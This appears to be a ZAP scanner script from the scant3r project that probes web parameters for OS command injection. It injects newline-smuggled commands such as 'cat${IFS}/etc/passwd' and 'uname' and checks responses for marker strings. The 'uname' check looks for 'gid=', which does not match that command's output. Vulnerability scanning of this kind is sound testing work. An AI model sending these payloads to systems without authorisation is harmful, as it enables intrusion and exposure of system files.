"""
github : https://github.com/knassar702/scant3r
--
* Coded by : Khaled Nassar @knassar702
* Email : knassar702@gmail.com

"""
follow_redirects = False
def scanNode(sas, msg):
  pass

rce_payloads = {
    '''
cat${IFS}/etc/passwd''':'root:x:0:0',
    '''
cat /etc/passwd''':'root:x:0:0',
    '''
uname''':'gid='
    }

def scan(sas, msg, param, value):
  for payload,message in rce_payloads.items():
  # Copy requests before reusing them
    msg = msg.cloneRequest();
  # setParam (message, parameterName, newValue)
    sas.setParam(msg, param, payload);
  # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
    sas.sendAndReceive(msg, follow_redirects, False);
  # Test the response here, and make other requests as required
    if message in msg.getResponseBody().toString():
    # raiseAlert(risk, int reliability, String name, String description, String uri,
    #		String param, String attack, String otherInfo, String solution, String evidence,
    #		int cweId, int wascId, HttpMessage msg)
    # risk: 0: info, 1: low, 2: medium, 3: high
    # reliability: 0: falsePassitive, 1: suspicious, 2: warning
        sas.raiseAlert(3, 3, ' Remote Code Execution (Script)', 'Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.',msg.getRequestHeader().getURI().toString(), param, payload.replace('\n','%0a'), '', '',message, 0, 0, msg);
        break
